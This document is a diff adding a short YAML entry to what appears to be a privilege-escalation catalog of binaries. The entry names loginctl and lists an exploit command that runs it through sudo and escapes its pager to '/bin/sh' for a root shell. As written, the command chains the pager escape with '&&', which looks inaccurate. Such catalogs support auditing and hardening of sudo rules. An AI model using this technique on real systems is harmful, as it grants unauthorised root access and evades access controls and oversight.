@@ -1,0 +1,4 @@
+name: loginctl
+binary_path: /usr/bin/loginctl
+exploit_cmds:
+- sudo /usr/bin/loginctl user-status && !/bin/sh
